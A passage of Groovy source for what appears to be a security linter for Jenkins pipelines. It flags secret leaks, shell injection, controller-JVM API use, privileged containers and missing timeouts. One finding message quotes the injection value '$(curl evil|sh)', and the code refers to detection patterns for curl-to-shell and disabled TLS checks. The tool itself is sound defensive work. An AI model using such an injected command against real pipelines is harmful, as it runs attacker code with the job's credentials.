                TaintRef cur = locals[name]
                if (cur == null || rank(best.kind) > rank(cur.kind)) {
                    String origin = best.name.contains(' (from ') ?
                        best.name.substring(best.name.indexOf(' (from ') + 7, best.name.length() - 1) : best.name
                    locals[name] = new TaintRef(kind: best.kind, name: origin, via: best.via)
                    changed = true
                }
            }
        }
    }

    private static int rank(String kind) {
        return kind == SECRET ? 3 : (kind == SCM ? 2 : 1)
    }
}

class Prepass extends CodeVisitorSupport {
    final Taint taint
    final List<Map> assignments = []
    final Set<String> cpsMethodNames = new HashSet<String>()
    private final ArrayDeque<String> stack = new ArrayDeque<String>()

    Prepass(Taint taint) {
        this.taint = taint
    }

    @Override
    void visitMethodCallExpression(MethodCallExpression c) {
        String name = c.methodAsString ?: '?'
        if (stack.contains('parameters') && Vocabulary.PARAM_KINDS.contains(name)) {
            String pname = Ast.constString(Ast.named(c.arguments)['name'])
            if (pname != null) {
                taint.paramKinds[pname] = name
            }
        }
        if (name == 'withCredentials') {
            taint.allSecretNames.addAll(Ast.bindingNames(c))
        }
        if (name == 'environment') {
            taint.allSecretNames.addAll(Ast.environmentCredentials(Ast.closureArg(c)))
        }
        stack.push(name)
        try {
            super.visitMethodCallExpression(c)
        } finally {
            stack.pop()
        }
    }

    @Override
    void visitMapExpression(MapExpression m) {
        if (stack.contains('parameters')) {
            String cls = null
            String pname = null
            for (MapEntryExpression me : m.mapEntryExpressions) {
                String k = Ast.constString(me.keyExpression)
                if (k == '$class') {
                    cls = Ast.constString(me.valueExpression)
                } else if (k == 'name') {
                    pname = Ast.constString(me.valueExpression)
                }
            }
            if (cls != null && pname != null) {
                String simple = cls.contains('.') ? cls.substring(cls.lastIndexOf('.') + 1) : cls
                String kind = simple.startsWith('Boolean') ? 'booleanParam' :
                    simple.startsWith('Choice') ? 'choice' :
                        simple.startsWith('Password') ? 'password' : 'string'
                taint.paramKinds[pname] = kind
            }
        }
        super.visitMapExpression(m)
    }

    @Override
    void visitBinaryExpression(BinaryExpression b) {
        String op = b.operation.text
        if (op == '=' || op == '+=' || op == '<<') {
            String target = null
            if (b.leftExpression instanceof VariableExpression) {
                target = ((VariableExpression) b.leftExpression).name
            } else if (b.leftExpression instanceof PropertyExpression) {
                String d = Ast.dotted(b.leftExpression)
                if (d != null && d.startsWith('env.') && d.indexOf('.', 4) < 0) {
                    target = d.substring(4)
                }
            }
            if (target != null && !stack.contains('environment')) {
                taint.assignedNames << target
                if (!(b.rightExpression instanceof EmptyExpression)) {
                    assignments << [name: target, rhs: b.rightExpression]
                }
            }
        }
        super.visitBinaryExpression(b)
    }
}

class StepFinder extends CodeVisitorSupport {
    final Set<String> steps
    final Set<String> ignore
    String foundName
    int foundLine = -1

    StepFinder(Set<String> steps, Set<String> ignore) {
        this.steps = steps
        this.ignore = ignore
    }

    static boolean isStepCall(MethodCallExpression c, Set<String> steps) {
        String name = c.methodAsString
        if (name == null || !steps.contains(name)) {
            return false
        }
        if (c.implicitThis) {
            return true
        }
        return c.objectExpression instanceof VariableExpression &&
            Vocabulary.STEP_RECEIVERS.contains(((VariableExpression) c.objectExpression).name)
    }

    @Override
    void visitMethodCallExpression(MethodCallExpression c) {
        if (foundName == null && isStepCall(c, steps) && !ignore.contains(c.methodAsString)) {
            foundName = c.methodAsString
            foundLine = c.lineNumber
            return
        }
        if (foundName == null) {
            super.visitMethodCallExpression(c)
        }
    }

    static StepFinder search(Object node, Set<String> steps, Set<String> ignore = Collections.<String>emptySet()) {
        StepFinder f = new StepFinder(steps, ignore)
        if (node instanceof Statement) {
            ((Statement) node).visit(f)
        } else if (node instanceof Expression) {
            ((Expression) node).visit(f)
        }
        return f
    }
}

class Frame {
    String name
    MethodCallExpression call
    Set<String> secrets = Collections.<String>emptySet()
    String agent
    boolean timeout
}

class Auditor extends CodeVisitorSupport {
    final Config cfg
    final SourceFile src
    final Taint taint
    final Set<String> steps
    final Set<String> cpsMethods
    final List<Finding> findings = []
    private final List<Frame> frames = []
    private final Map<Object, String> closureOwners = new IdentityHashMap<Object, String>()
    private final Set<Object> methodBodies = Collections.newSetFromMap(new IdentityHashMap<Object, Boolean>())
    private final Set<String> seen = new HashSet<String>()
    boolean nonCps = false
    String currentMethod

    Auditor(Config cfg, SourceFile src, Taint taint, Set<String> steps, Set<String> cpsMethods) {
        this.cfg = cfg
        this.src = src
        this.taint = taint
        this.steps = steps
        this.cpsMethods = cpsMethods
    }

    void report(String ruleId, Object node, String message, Severity override = null) {
        Rule rule = Rules.get(ruleId)
        if (!cfg.enabled(rule)) {
            return
        }
        Severity sev = override ?: rule.severity
        if (sev.ordinal() < cfg.minSeverity.ordinal()) {
            return
        }
        int line = Math.max(1, (int) node.lineNumber)
        int col = Math.max(1, (int) node.columnNumber)
        String key = "${ruleId}:${line}:${col}:${message}".toString()
        if (!seen.add(key)) {
            return
        }
        String snippet = src.lineAt(line).trim()
        if (snippet.length() > 180) {
            snippet = snippet.substring(0, 177) + '...'
        }
        findings << new Finding(rule: rule, severity: sev, file: src.display, line: line, column: col,
            message: message, snippet: snippet, suppressed: src.isSuppressed(line, ruleId))
    }

    void auditModule(ModuleNode module) {
        for (def imp : module.imports) {
            checkAnnotations(imp)
        }
        for (def imp : module.starImports) {
            checkAnnotations(imp)
        }
        for (def imp : module.staticImports.values()) {
            checkAnnotations(imp)
        }
        for (def imp : module.staticStarImports.values()) {
            checkAnnotations(imp)
        }
        if (module.statementBlock != null) {
            nonCps = false
            currentMethod = null
            module.statementBlock.visit(this)
        }
        for (MethodNode m : module.methods) {
            auditMethod(m)
        }
        for (ClassNode cn : module.classes) {
            if (cn.isScript()) {
                continue
            }
            checkAnnotations(cn)
            for (def field : cn.fields) {
                checkAnnotations(field)
                if (field.initialExpression != null) {
                    nonCps = false
                    currentMethod = null
                    field.initialExpression.visit(this)
                }
            }
            for (MethodNode m : cn.methods) {
                auditMethod(m)
            }
            for (MethodNode m : cn.declaredConstructors) {
                auditMethod(m)
            }
        }
    }

    private void auditMethod(MethodNode m) {
        checkAnnotations(m)
        if (m.code == null) {
            return
        }
        nonCps = m.annotations.any { AnnotationNode a -> a.classNode.nameWithoutPackage == 'NonCPS' }
        currentMethod = m.name
        frames.clear()
        methodBodies.add(m.code)
        m.code.visit(this)
        nonCps = false
        currentMethod = null
    }

    private void checkAnnotations(AnnotatedNode node) {
        for (AnnotationNode a : node.annotations) {
            String n = a.classNode.nameWithoutPackage
            if (n == 'Library') {
                Expression v = a.getMember('value')
                if (v instanceof ListExpression) {
                    for (Expression x : ((ListExpression) v).expressions) {
                        checkLibrarySpec(x, a)
                    }
                } else if (v != null) {
                    checkLibrarySpec(v, a)
                }
            } else if (n in ['Grab', 'Grapes', 'GrabResolver', 'GrabConfig']) {
                report('JPH007', a, "@${n} resolves and loads jars inside the controller JVM at compile time. It is blocked in " +
                    'the sandbox and bypasses plugin and library review when it is not.')
            }
        }
    }

    private void checkLibrarySpec(Expression spec, Object where) {
        Set<String> none = Collections.<String>emptySet()
        List<TaintRef> tainted = taint.refs(spec, none).findAll { TaintRef r -> r.kind != Taint.SECRET }
        if (!tainted.isEmpty()) {
            report('JPH006', where, "Shared library identifier is built from ${tainted[0].name}. Whoever sets that value chooses the " +
                'code that runs with this job\'s credentials.', Severity.HIGH)
            return
        }
        String text = Ast.constString(spec)
        if (text == null) {
            if (spec instanceof GStringExpression && !Ast.staticText(spec).contains('@')) {
                report('JPH006', where, 'Shared library is loaded without a version, so the default branch configured on the ' +
                    'controller decides what code runs.', Severity.LOW)
            }
            return
        }
        int at = text.indexOf('@')
        if (at < 0) {
            report('JPH006', where, "Shared library '${text}' is loaded without a version, so the default configured on the " +
                'controller decides what code runs.', Severity.LOW)
            return
        }
        String name = text.substring(0, at)
        String version = text.substring(at + 1)
        String lower = version.toLowerCase(Locale.ROOT)
        boolean mutable = Vocabulary.MUTABLE_REFS.contains(lower) || lower.startsWith('feature/') ||
            lower.startsWith('bugfix/') || lower.startsWith('hotfix/') || lower.startsWith('release/') ||
            lower.startsWith('origin/') || version.isEmpty()
        if (mutable) {
            report('JPH006', where, "Shared library '${name}' tracks the mutable ref '${version}'. A push to that ref changes " +
                'this pipeline without a commit in this repository.')
        }
    }

    @Override
    void visitClosureExpression(ClosureExpression c) {
        if (c.code != null) {
            closureOwners[c.code] = frames.isEmpty() ? '' : frames.last().name
        }
        super.visitClosureExpression(c)
    }

    @Override
    void visitDeclarationExpression(DeclarationExpression d) {
        checkAnnotations(d)
        super.visitDeclarationExpression(d)
    }

    @Override
    void visitBlockStatement(BlockStatement block) {
        List<Statement> stmts = block.statements
        boolean isMethodBody = methodBodies.contains(block)
        String owner = closureOwners[block]
        boolean valueReturning = isMethodBody || (owner != null && !isBlockStep(owner))
        for (int i = 0; i < stmts.size(); i++) {
            Statement s = stmts[i]
            if (s instanceof ExpressionStatement) {
                Expression e = ((ExpressionStatement) s).expression
                if (e instanceof MethodCallExpression) {
                    MethodCallExpression c = (MethodCallExpression) e
                    boolean last = i == stmts.size() - 1
                    if (isShell(c) && Ast.constTrue(Ast.named(c.arguments)['returnStatus']) && !(last && valueReturning)) {
                        report('JPH034', c, "${c.methodAsString} is called with returnStatus: true and the status is thrown away, so a " +
                            'failing command can never fail this build.')
                    }
                }
                if (!nonCps) {
                    checkNonSerializable(stmts, i, e)
                }
            }
        }
        super.visitBlockStatement(block)
    }

    private boolean isBlockStep(String owner) {
        return owner.isEmpty() || steps.contains(owner) || owner in ['steps', 'stages', 'pipeline', 'post', 'always',
            'success', 'failure', 'unstable', 'changed', 'cleanup', 'aborted', 'fixed', 'regression', 'unsuccessful',
            'matrix', 'axes', 'options', 'environment', 'when', 'expression', 'inside', 'withRun', 'withRegistry',
            'withServer', 'withTool']
    }

    private void checkNonSerializable(List<Statement> stmts, int i, Expression e) {
        if (!(e instanceof BinaryExpression) || ((BinaryExpression) e).operation.text != '=') {
            return
        }
        BinaryExpression b = (BinaryExpression) e
        if (!(b.leftExpression instanceof VariableExpression)) {
            return
        }
        String kind = nonSerializableKind(b.rightExpression)
        if (kind == null) {
            return
        }
        String var = ((VariableExpression) b.leftExpression).name
        for (int j = i + 1; j < stmts.size(); j++) {
            Statement later = stmts[j]
            if (isNullAssignment(later, var)) {
                return
            }
            StepFinder f = StepFinder.search(later, steps, ['echo', 'error'] as Set)
            if (f.foundName != null) {
                report('JPH022', b, "'${var}' holds ${kind}, which is not serializable, and is still in scope when ${f.foundName} " +
                    "runs on line ${f.foundLine}. The CPS engine saves every live local at each step and will throw " +
                    'NotSerializableException, often only after a controller restart or under load.')
                return
            }
        }
    }

    private static boolean isNullAssignment(Statement s, String var) {
        if (!(s instanceof ExpressionStatement)) {
            return false
        }
        Expression e = ((ExpressionStatement) s).expression
        if (e instanceof BinaryExpression && !(e instanceof DeclarationExpression)) {
            BinaryExpression b = (BinaryExpression) e
            return b.operation.text == '=' && b.leftExpression instanceof VariableExpression &&
                ((VariableExpression) b.leftExpression).name == var &&
                b.rightExpression instanceof ConstantExpression && ((ConstantExpression) b.rightExpression).value == null
        }
        return false
    }

    private static String nonSerializableKind(Expression rhs) {
        if (rhs instanceof BinaryExpression && ((BinaryExpression) rhs).operation.text == '=~') {
            return 'a java.util.regex.Matcher'
        }
        if (rhs instanceof ConstructorCallExpression) {
            String t = ((ConstructorCallExpression) rhs).type.nameWithoutPackage
            if (t == 'JsonSlurper') {
                return 'a JsonSlurper'
            }
            if (t == 'XmlSlurper') {
                return 'an XmlSlurper'
            }
            return null
        }
        if (rhs instanceof MethodCallExpression) {
            MethodCallExpression m = (MethodCallExpression) rhs
            String name = m.methodAsString
            if (name in ['parseText', 'parse'] && m.objectExpression instanceof ConstructorCallExpression) {
                String t = ((ConstructorCallExpression) m.objectExpression).type.nameWithoutPackage
                if (t == 'JsonSlurper') {
                    return 'a JsonSlurper result (LazyMap)'
                }
                if (t == 'XmlSlurper') {
                    return 'an XmlSlurper result (GPathResult)'
                }
            }
            if (!m.implicitThis && Ast.positional(m.arguments).isEmpty() && Ast.named(m.arguments).isEmpty()) {
                if (name in ['iterator', 'listIterator']) {
                    return 'an Iterator'
                }
                if (name in ['keySet', 'entrySet']) {
                    return "a map ${name} view".toString()
                }
            }
            if (!m.implicitThis && name == 'matcher') {
                return 'a java.util.regex.Matcher'
            }
        }
        return null
    }

    @Override
    void visitTryCatchFinally(TryCatchStatement t) {
        boolean handlesInterrupt = t.catchStatements.any { CatchStatement c ->
            c.exceptionType.nameWithoutPackage in ['FlowInterruptedException', 'InterruptedException', 'AbortException']
        }
        if (!handlesInterrupt) {
            for (CatchStatement c : t.catchStatements) {
                String type = c.exceptionType.nameWithoutPackage
                if (!(type in ['Exception', 'Throwable', 'Object', 'RuntimeException'])) {
                    continue
                }
                if (rethrows(c.code)) {
                    continue
                }
                StepFinder f = StepFinder.search(t.tryStatement, steps, ['echo'] as Set)
                if (f.foundName != null) {
                    String shown = type == 'Object' ? 'an untyped catch' : "catch (${type})".toString()
                    report('JPH023', c, "${shown} wraps ${f.foundName} and does not rethrow. Aborting the build or hitting a timeout " +
                        'raises FlowInterruptedException inside that step, so this block turns an abort into a normal continue.')
                }
            }
        }
        super.visitTryCatchFinally(t)
    }

    private static boolean rethrows(Statement body) {
        boolean[] found = [false] as boolean[]
        CodeVisitorSupport v = new CodeVisitorSupport() {
            @Override
            void visitThrowStatement(ThrowStatement s) {
                found[0] = true
            }

            @Override
            void visitMethodCallExpression(MethodCallExpression c) {
                if (c.methodAsString == 'error' && c.implicitThis) {
                    found[0] = true
                }
                super.visitMethodCallExpression(c)
            }

            @Override
            void visitClosureExpression(ClosureExpression c) {
            }
        }
        if (body != null) {
            body.visit(v)
        }
        return found[0]
    }

    @Override
    void visitConstructorCallExpression(ConstructorCallExpression c) {
        String t = c.type.nameWithoutPackage
        if (t in ['GroovyShell', 'GroovyClassLoader', 'GroovyScriptEngine']) {
            report('JPH005', c, "new ${t}() compiles arbitrary Groovy inside the controller JVM, outside CPS and outside the sandbox " +
                'once approved.')
        } else if (t == 'File' && c.type.name in ['File', 'java.io.File']) {
            report('JPH007', c, 'new File(...) opens a path on the controller file system, not in the agent workspace. On a remote ' +
                'agent the file is not there, and on the controller it can read JENKINS_HOME.')
        } else if (t == 'URL' && c.type.name in ['URL', 'java.net.URL']) {
            report('JPH007', c, 'new URL(...) connections are opened from the controller JVM, so they use controller network ' +
                'access and block a CPS thread. Use httpRequest or curl on the agent.', Severity.LOW)
        } else if (t in ['FileInputStream', 'FileOutputStream', 'FileReader', 'FileWriter', 'ProcessBuilder']) {
            report('JPH007', c, "new ${t}(...) runs inside the controller JVM, not on the agent.")
        }
        super.visitConstructorCallExpression(c)
    }

    @Override
    void visitPropertyExpression(PropertyExpression p) {
        String d = Ast.dotted(p)
        if (d in ['Jenkins.instance', 'Hudson.instance', 'jenkins.model.Jenkins.instance', 'hudson.model.Hudson.instance',
                  'Jenkins.instanceOrNull', 'Jenkins.activeInstance']) {
            report('JPH007', p, "${d} hands the pipeline the whole controller object model. It needs script approval or a " +
                'trusted library, and one mistake there affects every job on the instance.')
        }
        super.visitPropertyExpression(p)
    }

    private boolean isShell(MethodCallExpression c) {
        return Vocabulary.SHELL_STEPS.contains(c.methodAsString) && StepFinder.isStepCall(c, Vocabulary.SHELL_STEPS)
    }

    private Set<String> activeSecrets() {
        Set<String> out = new LinkedHashSet<String>()
        for (Frame f : frames) {
            out.addAll(f.secrets)
        }
        for (Map.Entry<String, TaintRef> e : taint.locals.entrySet()) {
            if (e.value.kind == Taint.SECRET) {
                out << e.key
            }
        }
        return out
    }

    private boolean inFrame(String name) {
        return frames.any { Frame f -> f.name == name }
    }

    private String agentState(int fromIndexExclusive) {
        String state = null
        for (int i = fromIndexExclusive - 1; i >= 0; i--) {
            Frame f = frames[i]
            if (f.agent == 'yes') {
                return 'yes'
            }
            if (f.agent != null && state == null) {
                state = f.agent
            }
        }
        return state
    }

    private boolean timeoutCovered() {
        return frames.any { Frame f -> f.timeout }
    }

    private Frame makeFrame(String name, MethodCallExpression c) {
        Frame f = new Frame(name: name, call: c)
        switch (name) {
            case 'withCredentials':
                f.secrets = Ast.bindingNames(c)
                break
            case 'node':
            case 'dockerNode':
                f.agent = 'yes'
                break
            case 'timeout':
                f.timeout = true
                break
            case 'pipeline':
            case 'stage':
                ClosureExpression body = Ast.closureArg(c)
                Set<String> secrets = new LinkedHashSet<String>()
                for (MethodCallExpression dc : Ast.directCalls(body)) {
                    String n = dc.methodAsString
                    if (n == 'agent') {
                        List<Expression> pos = Ast.positional(dc.arguments)
                        Expression first = pos.isEmpty() ? null : pos[0]
                        boolean none = Ast.dotted(first) == 'none' || Ast.constString(first) == 'none'
                        f.agent = none ? 'none' : 'yes'
                    } else if (n == 'options') {
                        if (Ast.directCalls(Ast.closureArg(dc)).any { MethodCallExpression o -> o.methodAsString == 'timeout' }) {
                            f.timeout = true
                        }
                    } else if (n == 'environment') {
                        secrets.addAll(Ast.environmentCredentials(Ast.closureArg(dc)))
                    }
                }
                f.secrets = secrets
                break
        }
        return f
    }

    @Override
    void visitMethodCallExpression(MethodCallExpression c) {
        String name = c.methodAsString
        if (name == null) {
            super.visitMethodCallExpression(c)
            return
        }
        boolean stepCall = StepFinder.isStepCall(c, steps)

        if (isShell(c)) {
            checkShell(c)
        }
        if (Vocabulary.LOG_STEPS.contains(name) && c.implicitThis) {
            checkLogging(c)
        }
        checkDynamicCode(c, name)
        checkControllerApis(c, name)
        checkContainers(c, name)
        checkExecutors(c, name)
        if (name == 'library' && stepCall) {
            Expression spec = Ast.named(c.arguments)['identifier'] ?: Ast.positional(c.arguments).find { true }
            if (spec != null) {
                checkLibrarySpec(spec, c)
            }
        }
        if (Vocabulary.WAIT_STEPS.contains(name) && stepCall) {
            checkWait(c, name)
        }
        if (nonCps) {
            if (stepCall && !Vocabulary.NONCPS_TOLERATED.contains(name)) {
                report('JPH020', c, "@NonCPS method ${currentMethod}() calls the ${name} step. A step needs the CPS engine to suspend " +
                    'and resume. From @NonCPS code the method returns early with the wrong value or the build fails with ' +
                    '"expected to call ... but wound up catching".')
            } else if (c.implicitThis && cpsMethods.contains(name) && name != currentMethod) {
                report('JPH020', c, "@NonCPS method ${currentMethod}() calls ${name}(), which is CPS transformed. The call runs only " +
                    "up to its first step and its return value replaces the result of ${currentMethod}().")
            }
        } else if (!c.implicitThis && Vocabulary.CPS_UNSAFE_CLOSURE_METHODS.contains(name) && Ast.closureArg(c) != null) {
            report('JPH021', c, "${name} { ... } hands a CPS transformed closure to a method that calls it from plain Java. The " +
                'closure body is not really evaluated, so the result is wrong without any error (JENKINS-44924).')
        }
        if (name == 'pipeline' && c.implicitThis && frames.isEmpty() && Ast.closureArg(c) != null && currentMethod == null) {
            checkDeclarativeRoot(c)
        }
        if (name == 'node' && stepCall && !inFrame('pipeline') && !inFrame('node') && !timeoutCovered()) {
            ClosureExpression body = Ast.closureArg(c)
            if (body != null && StepFinder.search(body, ['timeout'] as Set).foundName == null) {
                report('JPH032', c, 'This node block has no timeout around it or inside it. One hung command keeps the executor ' +
                    'until someone notices.')
            }
        }

        Frame frame = makeFrame(name, c)
        frames << frame
        try {
            super.visitMethodCallExpression(c)
        } finally {
            frames.remove(frames.size() - 1)
        }
    }

    private void checkShell(MethodCallExpression c) {
        String step = c.methodAsString
        Map<String, Expression> named = Ast.named(c.arguments)
        Expression cmd = named['script'] ?: Ast.positional(c.arguments).find { Expression e -> !(e instanceof ClosureExpression) }
        if (cmd == null) {
            return
        }
        if (Ast.constString(cmd) == null) {
            List<TaintRef> refs = taint.refs(cmd, activeSecrets())
            reportRefs(c, step, refs)
        }
        String text = Ast.staticText(cmd)
        for (Pattern p : Vocabulary.TLS_OFF) {
            Matcher m = p.matcher(text)
            if (m.find()) {
                report('JPH008', c, "${step} runs '${clip(m.group())}', which accepts any TLS certificate. Anyone on the network path " +
                    'can swap the download or read the credentials sent with it.')
                break
            }
        }
        Matcher pipe = Vocabulary.PIPE_TO_SHELL.matcher(text)
        if (pipe.find()) {
            report('JPH009', c, "${step} runs '${clip(pipe.group())}'. The remote script executes with the job's credentials and " +
                'workspace, and nothing checks that it is the script you reviewed.')
        }
        if (step == 'sh') {
            Matcher forced = Vocabulary.FORCED_SUCCESS.matcher(text)
            if (forced.find()) {
                report('JPH036', c, "sh script contains '${clip(forced.group().trim())}', so the command it guards can fail without " +
                    'failing the build.')
            }
            String producer = ShellScan.maskedProducer(text)
            if (producer != null) {
                report('JPH035', c, "sh pipes '${clip(producer)}' into another command without pipefail. If '${clip(producer)}' fails, " +
                    'the step still succeeds because only the last command in the pipe sets the exit code.')
            }
        }
    }

    private void reportRefs(MethodCallExpression c, String step, List<TaintRef> refs) {
        Map<String, List<TaintRef>> byKind = refs.groupBy { TaintRef r -> r.kind }
        List<TaintRef> secrets = byKind[Taint.SECRET] ?: []
        if (!secrets.isEmpty()) {
            String names = secrets.collect { TaintRef r -> r.name }.unique().join(', ')
            report('JPH001', c, "${step} gets a Groovy string with ${names} already expanded. The secret value becomes part of the " +
                'command line, shows up in the process list and in any shell trace, and can escape log masking when the ' +
                'shell quotes or splits it.')
        }
        reportUntrusted(c, step, byKind[Taint.SCM] ?: [], 'JPH003',
            'A branch name, tag or pull request field such as $(curl evil|sh) runs as a command on the agent.')
        reportUntrusted(c, step, byKind[Taint.PARAM] ?: [], 'JPH004',
            'Anyone who may start this job, including through the API, can append their own shell commands.')
    }

    private void reportUntrusted(MethodCallExpression c, String step, List<TaintRef> refs, String ruleId, String impact) {
        if (refs.isEmpty()) {
            return
        }
        List<TaintRef> direct = refs.findAll { TaintRef r -> r.via == null }
        if (!direct.isEmpty()) {
            String names = direct.collect { TaintRef r -> r.name }.unique().join(', ')
            report(ruleId, c, "${step} gets a Groovy string with ${names} expanded into the command text. ${impact}")
        } else {
            String names = refs.collect { TaintRef r -> "${r.name} via ${r.via}()".toString() }.unique().join(', ')
            report(ruleId, c, "${step} command includes ${names}. Confirm that function quotes or validates the value before " +
                'it reaches the shell.', Severity.LOW)
        }
    }

    private void checkLogging(MethodCallExpression c) {
        List<Expression> args = Ast.positional(c.arguments)
        Map<String, Expression> named = Ast.named(c.arguments)
        List<Expression> all = []
        all.addAll(args)
        all.addAll(named.values())
        Set<String> names = new LinkedHashSet<String>()
        Set<String> secrets = activeSecrets()
        for (Expression a : all) {
            for (TaintRef r : taint.refs(a, secrets)) {
                if (r.kind == Taint.SECRET) {
                    names << r.name
                }
            }
        }
        if (!names.isEmpty()) {
            report('JPH002', c, "${c.methodAsString} prints ${names.join(', ')}. Log masking only replaces exact matches of the " +
                'stored value, so an encoded, trimmed or multi line secret is written to the console log in clear text.')
        }
    }

    private void checkDynamicCode(MethodCallExpression c, String name) {
        Set<String> none = Collections.<String>emptySet()
        if (name == 'evaluate' && c.implicitThis) {
            List<TaintRef> refs = taint.refs(c.arguments, none)
            String extra = refs.isEmpty() ? '' : " The script text includes ${refs[0].name}.".toString()
            report('JPH005', c, 'evaluate compiles a string as pipeline code at run time, so the code that runs is not the code ' +
                'that was reviewed.' + extra)
        } else if (name in ['me', 'x', 'xy', 'xyz'] && Ast.dotted(c.objectExpression) in ['Eval', 'groovy.util.Eval']) {
            report('JPH005', c, "Eval.${name} compiles a string as Groovy inside the controller JVM.")
        } else if (name == 'load' && StepFinder.isStepCall(c, steps)) {
            List<TaintRef> refs = taint.refs(c.arguments, none).findAll { TaintRef r -> r.kind != Taint.SECRET }
            if (!refs.isEmpty()) {
                report('JPH005', c, "load takes its script path from ${refs[0].name}. Whoever sets that value picks which Groovy " +
                    'file runs with this job\'s credentials.')
            }
        }
    }

    private void checkControllerApis(MethodCallExpression c, String name) {
        if (c.implicitThis) {
            return
        }
        Expression obj = c.objectExpression
        String d = Ast.dotted(obj)
        if (name == 'execute' && Ast.isStringBuilding(obj) && !(obj instanceof VariableExpression)) {
            report('JPH007', c, 'String.execute() starts the process on the Jenkins controller, not on the agent that holds the ' +
                'workspace. Use the sh step.')
        } else if (d in ['Jenkins', 'Hudson', 'jenkins.model.Jenkins', 'hudson.model.Hudson'] &&
            name in ['getInstance', 'get', 'getInstanceOrNull', 'getActiveInstance']) {
            report('JPH007', c, "${d}.${name}() hands the pipeline the whole controller object model. It needs script approval or " +
                'a trusted library, and one mistake there affects every job on the instance.')
        } else if (d in ['System', 'java.lang.System'] && name == 'exit') {
            report('JPH007', c, 'System.exit() stops the Jenkins controller JVM, not this build. Use the error step.', Severity.HIGH)
        } else if (d in ['System', 'java.lang.System'] && name == 'getenv') {
            report('JPH007', c, 'System.getenv() reads the environment of the controller process. Agent and build variables ' +
                'live in env.', Severity.LOW)
        } else if (d in ['System', 'java.lang.System'] && name == 'setProperty') {
            report('JPH007', c, 'System.setProperty() changes a JVM wide setting on the controller for every job.')
        } else if (d in ['Thread', 'java.lang.Thread'] && name == 'sleep') {
            report('JPH007', c, 'Thread.sleep() blocks a CPS executor thread on the controller and cannot be aborted or resumed. ' +
                'Use the sleep step.', Severity.LOW)
        } else if (d in ['Runtime', 'java.lang.Runtime'] && name == 'getRuntime') {
            report('JPH007', c, 'Runtime.getRuntime() acts on the controller JVM, not on the agent.')
        }
    }

    private void checkContainers(MethodCallExpression c, String name) {
        boolean dockerAgent = inFrame('docker') || inFrame('dockerfile') || inFrame('kubernetes')
        boolean dockerGlobal = !c.implicitThis && Ast.dotted(c.objectExpression) == 'docker'
        if ((name == 'image' && c.implicitThis && inFrame('docker') && inFrame('agent')) || (name == 'image' && dockerGlobal)) {
            String image = Ast.constString(Ast.positional(c.arguments).find { true })
            if (image != null && isUnpinnedImage(image)) {
                report('JPH011', c, "Image '${image}' has no fixed tag or digest, so two runs of the same commit can build with " +
                    'different toolchains.')
            }
        }
        List<String> flagSources = []
        if (name == 'args' && c.implicitThis && dockerAgent) {
            flagSources.addAll(Ast.positional(c.arguments).collect { Expression e -> Ast.staticText(e) })
        }
        if (name in ['inside', 'withRun', 'run'] && !c.implicitThis && dockerRooted(c.objectExpression)) {
            flagSources.addAll(Ast.positional(c.arguments).findAll { Expression e -> !(e instanceof ClosureExpression) }
                .collect { Expression e -> Ast.staticText(e) })
        }
        for (String flags : flagSources) {
            for (Pattern p : Vocabulary.PRIVILEGED) {
                Matcher m = p.matcher(flags)
                if (m.find()) {
                    report('JPH010', c, "Container is started with '${clip(m.group())}'. Build scripts in that container can take " +
                        'over the agent host and read other jobs\' workspaces and credentials.')
                    break
                }
            }
        }
    }

    private static boolean dockerRooted(Expression e) {
        Expression cur = e
        int guard = 0
        while (cur != null && guard++ < 8) {
            if (cur instanceof VariableExpression) {
                return ((VariableExpression) cur).name == 'docker'
            }
            if (cur instanceof MethodCallExpression) {
                cur = ((MethodCallExpression) cur).objectExpression
            } else if (cur instanceof PropertyExpression) {
                cur = ((PropertyExpression) cur).objectExpression
            } else {
                return false
            }
        }
        return false
    }

    static boolean isUnpinnedImage(String image) {
        if (image.contains('@sha256:')) {
            return false
        }
        if (image.contains('$')) {
            return false
        }
        String last = image.contains('/') ? image.substring(image.lastIndexOf('/') + 1) : image
        int colon = last.lastIndexOf(':')
        if (colon < 0) {
            return true
        }
        return last.substring(colon + 1).toLowerCase(Locale.ROOT) in ['latest', 'stable', 'edge', 'nightly', 'main', 'master']
    }

    private void checkExecutors(MethodCallExpression c, String name) {
        if (!c.implicitThis) {
            return
        }
        String parent = frames.isEmpty() ? '' : frames.last().name
        List<Expression> pos = Ast.positional(c.arguments)
        Expression first = pos.isEmpty() ? null : pos[0]
        if (name == 'agent' && parent in ['pipeline', 'stage'] && Ast.dotted(first) == 'any') {
            report('JPH012', c, 'agent any lets the build land on whichever executor is free, including the built-in node if it ' +
                'has executors.', Severity.LOW)
        }
        String label = null
        if (name == 'node') {
            label = Ast.constString(first) ?: Ast.constString(Ast.named(c.arguments)['label'])
        } else if (name == 'label' && inFrame('agent')) {
            label = Ast.constString(first)
        } else if (name == 'agent' && parent in ['pipeline', 'stage']) {
            label = Ast.constString(Ast.named(c.arguments)['label'])
        }
        if (label != null && Vocabulary.CONTROLLER_LABELS.contains(label.trim().toLowerCase(Locale.ROOT))) {
            report('JPH012', c, "Label '${label}' runs build steps on the Jenkins controller, where the workspace sits next to " +
                'JENKINS_HOME, every stored credential and every other job\'s configuration.')
        }
    }

    private void checkWait(MethodCallExpression c, String name) {
        String parent = frames.isEmpty() ? '' : frames.last().name
        boolean directive = name == 'input' && parent == 'stage'
        if (name == 'input') {
            int scope = directive ? frames.size() - 1 : frames.size()
            if (agentState(scope) == 'yes') {
                String where = inFrame('node') ? 'inside a node block' :
                    (directive ? 'while the pipeline level agent is allocated' : 'while an agent is allocated')
                report('JPH030', c, "input waits for a person ${where}. The executor and workspace stay locked for as long as " +
                    'nobody answers, and the wait does not survive losing that agent.')
            }
        }
        if (!timeoutCovered()) {
            String what = name == 'input' ? 'input waits for a person' :
                name == 'waitUntil' ? 'waitUntil retries its condition' : 'waitForQualityGate waits for a webhook'
            report('JPH031', c, "${what} with no timeout in scope. If the answer never arrives the build stays open forever.")
        }
    }

    private void checkDeclarativeRoot(MethodCallExpression c) {
        ClosureExpression body = Ast.closureArg(c)
        List<MethodCallExpression> direct = Ast.directCalls(body)
        MethodCallExpression options = direct.find { MethodCallExpression d -> d.methodAsString == 'options' }
        List<MethodCallExpression> opts = options == null ? [] : Ast.directCalls(Ast.closureArg(options))
        if (!opts.any { MethodCallExpression o -> o.methodAsString == 'timeout' }) {
            report('JPH032', c, 'The pipeline has no options { timeout(...) }. A hung command, a lost agent or an unanswered ' +
                'prompt keeps the build and its executor until someone aborts it by hand.')
        }
        if (!opts.any { MethodCallExpression o -> o.methodAsString == 'buildDiscarder' }) {
